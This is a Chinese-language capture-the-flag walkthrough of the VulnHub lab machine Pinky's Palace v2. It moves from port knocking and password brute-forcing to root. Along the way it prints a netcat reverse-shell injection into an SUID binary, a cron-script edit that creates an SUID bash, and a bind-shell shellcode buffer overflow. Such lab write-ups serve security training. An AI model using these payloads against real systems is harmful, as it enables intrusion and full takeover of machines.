# Pinky's Palace: v2

2024-5-5 https://www.vulnhub.com/entry/pinkys-palace-v2,229/

Difficulty to get entry: easy/intermediate

Difficulty to get root: intermediate/hard

## IP

192.168.10.178

## Scan

根据提示，先将 echo 192.168.10.178 pinkydb 加入到 /etc/hosts 中

Open Port -> 80,4655,7654,31337

```
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
```

只有 80 是开放状态，其他几个端口被过滤的，状态不明。

先看看 80 web 是 wordpress， 看看有什么信息，目录扫描时，使用前面配置的域名，不要使用 IP，否则扫描不出来。

```
gobuster dir -u http://pinkydb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip
```

发现非 wp 目录 http://pinkydb/secret/ ，存在文件 bambam.txt ：

```
8890
7000
666

pinkydb
```

wpscan --url http://pinkydb/ --enumerate u 枚举出的用户为：pinky1337。

使用 cewl 收集网页上可能的密码，然后进行登陆爆破：

```
cewl -d 5 http://pinkydb/ -w pass.txt
wpscan --url http://pinkydb/ -U pinky1337 -P ./pass.txt
```

但是都没有成功。

再次观察 bambam.txt 文件，里面的数字像是端口。有没有可能是端口敲击，现在只能进行尝试，通过不断变换端口位置发现下面的敲击后上面几个端口变成 open 状态：

```
knock 192.168.10.178 7000 666 8890
```

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 ace64177601fe87c0213aea1330994b7 (RSA)
|   256 3a4863f9d207ea43787de193ebf1d23a (ECDSA)
|_  256 b11003dcbbf30d9b3ae3e46103c803c7 (ED25519)
7654/tcp  open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  Elite?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|   GetRequest:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HTTP/1.0
|   HTTPOptions:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / HTTP/1.0
|   Help:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HELP
|   RTSPRequest:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / RTSP/1.0
|   SIPOptions:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|_    Accept: application/sdp
```

4655 ssh 端口不允许匿名登陆，也没有提示信息。

http://pinkydb:7654/login.php 是一个登陆页面，经过尝试不存在 sql 注入，看样子必须找到用户名和密码。

可能跟 bambam.txt 有关系，用户名尝试使用 pinkydb、pinky、pinky1337，密码尝试使用 cewl 收集到的，用 hashcat 生成：

```
john -rules -wordlist=pass.txt -stdout | tee wordlist.txt
echo -e "pinkydb\npinky\npinky1337" > user.txt
hydra -t 20 -L user.txt -P wordlist.txt pinkydb -s 7654 -f http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid Username or Password"
```

找到了用户的登陆凭证：pinky:Passione ，登陆系统，看到有两个链接：

```
http://pinkydb:7654/credentialsdir1425364865/notes.txt
http://pinkydb:7654/credentialsdir1425364865/id_rsa
```

notes.txt 提示有一个用户名：stefano，还有一个 rsa 的密钥，就是下面那个链接，下载到 kali 上。

```
- Stefano
- Intern Web developer
- Created RSA key for security for him to login
```

使用得到的私钥进行登陆：

```
chmod 600 id_rsa
ssh -i id_rsa stefano@192.168.10.178 -p 4655
```

但是提示私钥有密码，进一步使用 John 进行破解：

```
ssh2john id_rsa > hash
john hash --wordlist=~/tools/dict/rockyou.txt
```

找到 rsa 的密钥：secretz101

继续进行 ssh 登陆，输入上面得到的密钥，登陆成功。

进行系统枚举，内核版本 4.9.0-4，sudo -l 没有内容，home 目录下有 3 个用户：demon、pinky、stefano，demon、pinky 用户目录进不去。

查看 suid 程序发现 /home/stefano/tools/qsub：

```
-rwsr----x 1 pinky   www-data 13384 Mar 16  2018 qsub
```

并且有一个 note.txt 提示：

```
stefano@Pinkys-Palace:~/tools$ cat note.txt
Pinky made me this program so I can easily send messages to him
```

根据提示，估计是先要提权到 pinky 用户才行。

尝试执行 qsub 要输入密码，但是目前不知道密码。由于 stefano 对 qsub 没有读取权限，strings 查看不到其中的字符串内容，尝试切换到 www-data 用户进行读取。

先看看之前两个网站中的信息，能不能尝试找到用户名和密码，在 /var/www/html/apache/wp-config.php 发现了：

```
define('DB_NAME', 'pwp_db');
define('DB_USER', 'pinkywp');
define('DB_PASSWORD', 'pinkydbpass_wp');
```

进行登陆:

```
mysql -upinkywp -ppinkydbpass_wp
use pwp_db
select * from wp_users;

pinky1337 | $P$BqBoittC5WZl0XUL8GVKO1t9R6HcJU/
```

尝试破解不成功，先用自己生成的 123 对应的密文 `$P$BgSROuUgHaBcoXJ80/Sx039Jw1lJgj/` 进行替换。

```
update wp_users set user_pass='$P$BgSROuUgHaBcoXJ80/Sx039Jw1lJgj/' where ID = 1;
```

然后尝试用 pinky1337:123 登陆系统，但是在 wp 中没有修改 php 代码并保存的权限，导致不能反弹 web shell，这条路走不通，换其他方向。

看我们最开始登陆的页面 http://pinkydb:7654/pageegap.php?1337=filesselif1001.php ，这里应该存在 LFI 文件包含，尝试修改成 http://pinkydb:7654/pageegap.php?1337=/home/stefano/tools/qsub 大概能看到程序中的字符串内容：

```
/bin/echo %s >> /home/pinky/messages/stefano_msg.txt %s <Message>
TERM[+] Input Password: %sBad hacker! Go away![+] Welcome to Question Submit![!] Incorrect Password!
```

看到上面有个 TERM，看看目标机器上的 TERM 是什么：echo $TERM —> xterm-256color，看看 xterm-256color 是不是密码，可以看到验证能通过。

根据看到的字符串，再次尝试构造反弹 shell:

```
./qsub "$(echo -e '\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.10.3 8888 >/tmp/f\necho 1')"
```

在 kali 上监听 8888 端口，得到了反弹的 shell，先升级 tty。

在 /home/pinky/.bash_history 中得到了历史操作记录：

```
ls -al
cd
ls -al
cd /usr/local/bin
ls -al
vim backup.sh
su demon
```

猜测是一个定时任务调用的 backup.sh，看看 /usr/local/bin/backup.sh 有什么内容，但是显示权限不够。

```
pinky@Pinkys-Palace:/var/spool/cron$ ls -al /usr/local/bin/backup.sh
-rwxrwx--- 1 demon pinky 113 Mar 17  2018 /usr/local/bin/backup.sh

id
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
```

我们需要使当前用户切换到 pinky 组：

```
newgrp pinky

id
uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),1002(stefano)
```

修改脚本内容：

```
echo 'cp /bin/bash /tmp/tmpbash; chmod +xs /tmp/tmpbash' >> /usr/local/bin/backup.sh
```

过了一会，在/tmp 目录下，得到了 demon 权限的 suid 程序/tmp/tmpbash -p ,我们得到了 demon 权限的 shell。

最后应该就是从 demon 升级到 root 了。

通过枚举，发下下面 1 个服务调用了 demon 用户的程序 /daemon/panel：

```
/etc/systemd/system/daemon.service is calling this writable executable: /daemon/panel
/etc/systemd/system/multi-user.target.wants/daemon.service is calling this writable executable: /daemon/panel

-rwxr-x---  1 demon demon 13280 Mar 17  2018 panel
```

```
[Unit]
Description=BDdaemon
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/daemon
ExecStart=/daemon/panel
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

发现 root 用户正在运行 /daemon/panel ：

```
tmpbash-4.4$ ps -ef |grep daemon
message+    397      1  0 00:21 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root        444      1  0 00:21 ?        00:00:00 /daemon/panel
root        452    444  0 00:21 ?        00:00:00 /daemon/panel
```

并且 panel 监听了 31337 端口。

经过查找资料，找到了利用这个端口提升到 root 权限的 payload，在 kali 上执行下面 shellcode，在目标机器上开启 5600 监听端口：

```
python2 -c 'print "\x90"*33 + "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05" + "\xfb\x0c\x40\x00\x00\x00"' | nc pinkydb 31337
```

然后在 kali 上去正向连接目标机器的 5600 端口，最终得到了以 root 权限的 shell：

```
nc -v pinkydb 5600
pinkydb [192.168.10.178] 5600 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
cat root.txt

 ____  _       _          _
|  _ \(_)_ __ | | ___   _( )___
| |_) | | '_ \| |/ / | | |// __|
|  __/| | | | |   <| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/
 ____       _
|  _ \ __ _| | __ _  ___ ___
| |_) / _` | |/ _` |/ __/ _ \
|  __/ (_| | | (_| | (_|  __/
|_|   \__,_|_|\__,_|\___\___|

[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!
[+] Flag: 2208f787fcc6433b4798d2189af7424d
[+] Twitter: @Pink_P4nther
[+] Cheers to VulnHub!
[+] VM Host: VMware
[+] Type: CTF || [Realistic]
[+] Hopefully you enjoyed this and gained something from it as well!!!
```
